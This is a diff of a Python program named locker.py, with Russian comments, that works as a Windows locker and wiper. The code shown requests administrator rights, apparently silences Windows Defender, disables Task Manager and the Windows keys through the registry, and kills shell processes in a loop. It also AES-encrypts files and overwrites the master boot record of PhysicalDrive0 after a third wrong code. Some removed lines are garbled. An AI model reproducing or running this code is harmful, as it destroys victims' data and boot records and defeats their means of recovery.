@@ -1,7 +1,4 @@
 # language: Python, file: locker.py
-# Сборка: pyinstaller --noconsole --onefile --uac-admin ^
-#         --add-data "assets;assets" --add-data "scream.mp3;." ^
-#         --name locker locker.py
 # Зависимости: pillow keyboard psutil cryptography pygame
 # ВНИМАНИЕ: третий неверный код вызывает wipe_mbr — загрузка уничтожается. Только VM со снапшотом.
 
@@ -34,7 +31,6 @@ from cryptography.hazmat.backends import default_backend
 from cryptography.hazmat.primitives import padding
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 
-# ================= НАСТРОЙКИ =================
 _SALT = b"QackLockerSalt_2026"
 CORRECT_HASH = hashlib.sha256(_SALT + b"8841").hexdigest()
 
@@ -44,7 +40,6 @@ BLOCK_EXE = {
     "powershell.exe", "pwsh.exe", "wt.exe", "conhost.exe",
 }
 
-# ================= WINAPI =================
 kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
 GENERIC_READ = 0x80000000
 GENERIC_WRITE = 0x40000000
@@ -73,7 +68,7 @@ kernel32.DeviceIoControl.argtypes = [
     ctypes.POINTER(wintypes.DWORD), wintypes.LPVOID,
 ]
 
-# ================= UAC / DEFENDER =================
+
 def ensure_admin():
     if ctypes.windll.shell32.IsUserAnAdmin():
         return
@@ -85,6 +80,7 @@ def ensure_admin():
     except Exception:
         pass
     sys.exit(0)
+
 
 def quiet_defender():
     try:
@@ -101,7 +97,7 @@ def quiet_defender():
     except Exception:
         pass
 
-# ================= MBR WIPE =================
+
 def wipe_mbr() -> bool:
     h = kernel32.CreateFileW(
         r"\\.\PhysicalDrive0",
@@ -146,7 +142,7 @@ def wipe_mbr() -> bool:
     finally:
         kernel32.CloseHandle(h)
 
-# ================= РЕЕСТР =================
+
 def reg_set(path: str, name: str, value, vtype: int = 1) -> bool:
     import winreg
     try:
@@ -163,6 +159,7 @@ def reg_set(path: str, name: str, value, vtype: int = 1) -> bool:
         except Exception:
             return False
 
+
 def apply_reg_blocks():
     sys_path = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
     reg_set(sys_path, "DisableTaskMgr", 1)
@@ -173,7 +170,7 @@ def apply_reg_blocks():
         "NoWinKeys", 1,
     )
 
-# ================= ШИФРОВАНИЕ =================
+
 def encrypt_file(path: str, key: bytes, iv: bytes) -> None:
     try:
         with open(path, "rb") as f:
@@ -196,6 +193,7 @@ def encrypt_file(path: str, key: bytes, iv: bytes) -> None:
     except Exception:
         pass
 
+
 def encrypt_targets():
     base = os.path.dirname(os.path.abspath(sys.argv[0]))
     target = os.path.join(base, "TestFolder")
@@ -217,7 +215,7 @@ def encrypt_targets():
                 continue
             encrypt_file(fp, key, iv)
 
-# ================= ПРОЦЕССЫ =================
+
 def kill_blocked():
     for proc in psutil.process_iter(["name"]):
         try:
@@ -226,12 +224,19 @@ def kill_blocked():
         except Exception:
             pass
 
+
 def blocking_loop():
     while True:
         kill_blocked()
         time.sleep(0.1)
 
-# ================= ЗВУК =================
+
+def resource_path(rel: str):
+    base = getattr(sys, "_MEIPASS", os.path.abspath("."))
+    p = os.path.join(base, rel)
+    return p if os.path.exists(p) else None
+
+
 def play_scream():
     if not HAS_PYGAME:
         return
@@ -245,7 +250,7 @@ def play_scream():
     except Exception:
         pass
 
-# ================= ХОТКЕИ =================
+
 def install_hotkeys():
     if not HAS_KEYBOARD:
         return
@@ -258,18 +263,11 @@ def install_hotkeys():
         except Exception:
             pass
     try:
-        keyboard.block if_key("win")
-    h except Exceptionw:
+        keyboard.block_key("win")
+    except Exception:
         pass
 
-# =nd================ РЕСУРС:
-Ы            =================
-def c resource_path(rel: str):
-   types base = getattr(sys, "_ME.wIPASS", os.path.abindspath("."))
-ll    p = os.path.join(base.user, rel)
-    return p if os.path.exists(p) else None
 
-# ================= UI =================
 def main():
     ensure_admin()
     quiet_defender()
@@ -277,7 +275,8 @@ def main():
 
     try:
         hwnd = ctypes.windll.kernel32.GetConsoleWindow()
-       32.ShowWindow(hwnd, 0)
+        if hwnd:
+            ctypes.windll.user32.ShowWindow(hwnd, 0)
     except Exception:
         pass
 
@@ -464,6 +463,7 @@ def main():
 
     typing()
     win.mainloop()
+
 
 if __name__ == "__main__":
     main()
